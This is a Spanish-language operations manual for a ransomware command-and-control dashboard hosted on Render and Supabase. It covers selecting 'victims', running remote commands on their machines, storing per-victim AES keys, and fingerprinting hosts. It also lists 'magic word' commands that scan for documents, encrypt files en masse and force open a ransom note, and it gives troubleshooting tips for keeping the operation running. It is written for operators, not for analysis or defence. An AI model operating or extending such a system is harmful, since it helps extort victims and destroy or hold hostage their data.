# 📖 Manual de Operaciones: C2 Dashboard & Recovery

Este manual describe el uso diario del sistema C2 y los procedimientos de emergencia para recuperación de claves.

---

## 🆘 Procedimiento de Recuperación de Claves

**Escenario Crítico**: El servidor de Render se ha reiniciado y el Dashboard muestra claves vacías o "N/A" para clientes que ya estaban cifrados.

### Pasos de Recuperación (Supabase):
1. Accede a tu proyecto en [Supabase Dashboard](https://app.supabase.com).
2. Ve a **Table Editor** > Tabla **`keys`**.
3. Localiza la fila correspondiente al **UUID** o **Hostname** afectado.
4. Copia el valor de la columna **`aes_key`** (string hexadecimal de 64 caracteres).
5. **Uso Manual**:
   - Puedes usar esta clave para descifrar manualmente archivos `.cript` usando OpenSSL o un script de Node.js local si el comando de descifrado remoto falla.

### Comando OpenSSL para Descifrar:
```bash
openssl enc -d -aes-256-cbc -in archivo.cript -out archivo_original -K [CLAVE_HEX] -iv [IV_HEX]
```

---

## 🎛️ Operaciones del Dashboard

### 1. Panel de Control (Dashboard - index.html)
- **Selector de Cliente**: Permite elegir una víctima específica para enviar comandos dirigidos.
- **Información de Cifrado**: Muestra la clave AES-256 del cliente seleccionado.
- **Estado WS**: "Online" indica conexión activa con el servidor Socket.IO.
- **Ejecución en Cadena**: Botones numerados 1-4 para ejecutar el "Kill Chain" completo en orden.

### 2. Consola Remota (consola.html)
Terminal interactiva para ejecutar comandos en la máquina víctima:
- `dir` / `ls`: Listar archivos
- `whoami`: Ver usuario actual
- `systeminfo`: Información del sistema
- `cd [ruta]`: Cambiar directorio

### 3. Base de Datos (database.html)
Visualización de datos almacenados en Supabase:

| Pestaña | Datos Mostrados |
|---------|-----------------|
| **Víctimas** | UUID, Hostname, Usuario, IP, Plataforma, Arquitectura, Estado, Fecha |
| **Claves** | UUID, Hostname, Clave AES-256, Fecha |
| **Archivos** | UUID, Hostname, Archivo Cifrado, Original, Directorio, IV, Fecha |

**Funcionalidades:**
- **Filtro de búsqueda**: Escribe para filtrar por cualquier columna
- **Ordenar columnas**: Haz clic en las cabeceras para ordenar ascendente/descendente
- **Auto-refresh**: Los datos se actualizan cada 30 segundos

---

## ⚡ Comandos Especiales ("Magic Words")

El cliente reconoce prefijos especiales para tareas automatizadas:

| Comando | Acción |
|---------|--------|
| `c2:scan` | Escanea recursivamente buscando .pdf, .docx, .xlsx, .jpg, .mp3, .mp4 |
| `c2:encrypt [n]` | Cifra `n` archivos (defecto: 100). Ej: `c2:encrypt 500` |
| `c2:encrypt-all [n]` | Cifra TODOS los archivos (sin filtro de extensión) |
| `c2:ransom` | Fuerza la apertura de la nota de rescate (GUI) |
| `c2:kill` | **⚠️ Destructivo**: Detiene la persistencia y elimina el malware |

---

## 🔐 Información del Sistema Capturada

Cuando un cliente se conecta, se registra automáticamente:

| Campo | Descripción |
|-------|-------------|
| `hostname` | Nombre del equipo |
| `username` | Usuario actual |
| `ip` | Dirección IP (local o pública) |
| `platform` | Sistema operativo (win32, linux, darwin) |
| `arch` | Arquitectura (x64, arm64) |
| `os_version` | Versión del SO (ej: Windows 10 Pro) |
| `cpu_model` | Modelo del procesador |
| `total_memory` | Memoria RAM total |

---

## 🐛 Solución de Problemas (Troubleshooting)

### Dashboard "Dormido"
Si al entrar ves "WS: Offline":
1. Espera 30-60 segundos. Render pone en suspensión los servicios gratuitos tras inactividad.
2. Recarga la página (F5).

### Cliente conectado pero no responde
1. El cliente puede estar tras un Firewall estricto que bloquea WebSockets.
2. Intenta enviar un comando simple como `ping 127.0.0.1` para verificar vida.
3. Si no responde, espera al próximo "Heartbeat" (reconexión automática cada 5-10 min).

### Base de Datos vacía
1. Verifica que `SUPABASE_URL` y `SUPABASE_KEY` estén configuradas en Render.
2. Revisa los logs del servidor en Render para ver errores `[DB Error]`.
3. Asegúrate de haber creado las tablas en Supabase.

---